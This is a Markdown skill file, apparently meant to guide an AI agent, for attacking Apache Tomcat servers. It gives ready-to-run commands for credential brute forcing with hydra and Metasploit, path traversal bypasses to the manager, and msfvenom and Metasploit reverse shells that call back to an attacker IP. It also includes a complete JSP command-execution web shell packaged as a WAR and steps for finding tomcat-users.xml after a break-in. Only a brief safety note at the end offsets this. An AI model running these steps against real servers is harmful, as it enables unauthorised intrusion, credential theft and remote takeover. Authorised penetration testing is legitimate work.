---
name: tomcat-pentest
description: Perform Apache Tomcat security assessments including enumeration, vulnerability scanning, and exploitation. Use this skill whenever the user mentions Tomcat, Apache Tomcat, port 8080, web application manager, WAR file upload, or needs to assess a Java web server for security vulnerabilities. This skill covers discovery, version identification, credential testing, path traversal attacks, and RCE via manager access.
---

# Tomcat Pentest Skill

A comprehensive skill for assessing Apache Tomcat servers for security vulnerabilities.

## When to Use This Skill

Use this skill when:
- You need to enumerate or assess a Tomcat server
- You're testing port 8080 or similar Tomcat ports
- You need to check for default credentials or weak authentication
- You want to exploit known Tomcat vulnerabilities
- You need to upload WAR files for code execution
- You're performing web application security testing on Java servers

## Discovery

### Port Identification

Tomcat typically runs on port 8080, but check common variants:
- 8080 (default)
- 8005 (shutdown port)
- 8009 (AJP connector)
- 8443 (HTTPS)

### Initial Reconnaissance

```bash
# Check if Tomcat is running
curl -s http://target:8080/

# Look for Tomcat in response headers
curl -I http://target:8080/ | grep -i server
```

## Enumeration

### Version Identification

Identify the Tomcat version to determine applicable vulnerabilities:

```bash
# Check docs directory
curl -s http://target:8080/docs/ | grep -i tomcat

# Check manager status (may reveal version)
curl -s http://target:8080/manager/status

# Check error pages for version info
curl -s http://target:8080/nonexistent | grep -i tomcat
```

### Manager Directory Discovery

The manager and host-manager directories are critical targets. They may be renamed:

```bash
# Common paths to check
http://target:8080/manager/html
http://target:8080/manager/status
http://target:8080/host-manager/html
http://target:8080/manager/
http://target:8080/admin/

# Use directory brute-forcing
gobuster dir -u http://target:8080 -w /usr/share/wordlists/dirb/common.txt -x html,php,asp
```

### Default Credentials Testing

Test common default credentials on `/manager/html`:

| Username | Password |
|----------|----------|
| admin | admin |
| tomcat | tomcat |
| admin | (empty) |
| admin | s3cr3t |
| tomcat | s3cr3t |
| admin | tomcat |
| root | root |
| guest | guest |

```bash
# Using curl
curl -u admin:admin http://target:8080/manager/html

# Using hydra for brute force
hydra -L users.txt -P passwords.txt -f target http-get /manager/html

# Using Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target
set RPORT 8080
run
```

## Common Vulnerabilities

### Password Backtrace Disclosure

Some configurations expose passwords in error pages:

```bash
curl -s http://target:8080/auth.jsp
```

### Double URL Encoding (CVE-2007-1860)

Exploit mod_jk double URL encoding for path traversal:

```bash
# Access manager via encoded path
curl http://target:8080/%252E%252E/manager/html

# Alternative encoding
curl http://target:8080/..%252F..%252Fmanager/html
```

### Path Traversal via Reverse Proxy

Bypass protected paths using `..;/` trick:

```bash
# Access manager through arbitrary path
curl http://target:8080/lalala/..;/manager/html

# Using parameter trick
curl http://target:8080/;param=value/manager/html
```

### Examples Directory Exposure

Check for exposed example scripts (Tomcat 4.x-7.x):

```bash
# Sensitive example paths
http://target:8080/examples/jsp/snp/snoop.jsp
http://target:8080/examples/jsp/num/numguess.jsp
http://target:8080/examples/jsp/dates/date.jsp
http://target:8080/examples/servlet/RequestInfoExample
http://target:8080/tomcat-docs/appdev/sample/web/hello.jsp
```

## Remote Code Execution

### WAR File Upload via Manager

If you have manager access with appropriate roles (admin, manager, manager-script):

```bash
# Deploy WAR file
curl --upload-file shell.war -u 'username:password' \
  "http://target:8080/manager/text/deploy?path=/shell"

# Undeploy WAR file
curl -u 'username:password' \
  "http://target:8080/manager/text/undeploy?path=/shell"

# List deployed applications
curl -u 'username:password' \
  "http://target:8080/manager/text/list"
```

### Metasploit Exploitation

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS target
set RPORT 8080
set HTTPUSERNAME username
set HTTPPASSWORD password
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

### MSFVenom WAR Generation

```bash
# Generate reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -f war -o revshell.war

# Upload and access
curl --upload-file revshell.war -u 'user:pass' \
  "http://target:8080/manager/text/deploy?path=/revshell"

# Trigger shell
http://target:8080/revshell/
```

### Manual Web Shell Creation

Create a JSP web shell:

```bash
# Create index.jsp
cat > index.jsp << 'EOF'
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         String s = null;
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) { e.printStackTrace(); }
   }
%>
<pre><%=output %></pre>
EOF

# Package as WAR
mkdir webshell
cp index.jsp webshell/
cd webshell
jar -cvf ../webshell.war *
```

### Using tomcatWarDeployer

```bash
# Clone tool
git clone https://github.com/mgeeky/tomcatWarDeployer.git
cd tomcatWarDeployer

# Reverse shell
./tomcatWarDeployer.py -U username -P password \
  -H attacker_ip -p 4444 target:8080/manager/html/

# Bind shell
./tomcatWarDeployer.py -U username -P password \
  -p 4444 target:8080/manager/html/
```

### Using Clusterd

```bash
# Generate and deploy payload
clusterd.py -i target_ip -a tomcat -v 5.5 \
  --gen-payload attacker_ip:4444 \
  --deploy shell.war --invoke --rand-payload -o windows
```

## Post-Exploitation

### Locate tomcat-users.xml

```bash
# Find configuration file
find / -name tomcat-users.xml 2>/dev/null

# Common locations
/usr/share/tomcat9/etc/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xml
/etc/tomcat/tomcat-users.xml
```

### Understanding User Roles

```xml
<!-- Built-in Tomcat manager roles -->
<role rolename="manager-gui" />      <!-- HTML GUI and status pages -->
<role rolename="manager-script" />   <!-- HTTP API and status pages -->
<role rolename="manager-jmx" />      <!-- JMX proxy and status pages -->
<role rolename="manager-status" />   <!-- Status pages only -->
<role rolename="admin-gui" />        <!-- Admin GUI -->
<role rolename="admin-script" />     <!-- Admin HTTP API -->
```

### Privilege Escalation

If you have limited access, try to escalate:

```bash
# Check current user permissions
curl -u user:pass http://target:8080/manager/status

# Try to deploy with manager-script role
curl -u user:pass --upload-file shell.war \
  "http://target:8080/manager/text/deploy?path=/shell"

# Access admin functions
curl -u user:pass http://target:8080/admin/html
```

## Additional Tools

- **ApacheTomcatScanner**: https://github.com/p0dalirius/ApacheTomcatScanner
- **Nmap scripts**: `nmap --script http-tomcat-users` target
- **Burp Suite**: For manual testing and credential attacks
- **Dirb/Dirbuster**: For directory enumeration

## Workflow Summary

1. **Discovery**: Identify Tomcat on port 8080
2. **Enumeration**: Find version, manager paths, exposed directories
3. **Authentication**: Test default credentials, brute force if needed
4. **Vulnerability Check**: Test for path traversal, exposed examples
5. **Exploitation**: Upload WAR file for RCE if manager access obtained
6. **Post-Exploitation**: Locate config files, escalate privileges

## Safety Notes

- Always obtain proper authorization before testing
- Document all findings for the client
- Be careful with destructive operations (undeploy, delete)
- Test in isolated environments when possible
- Follow responsible disclosure practices
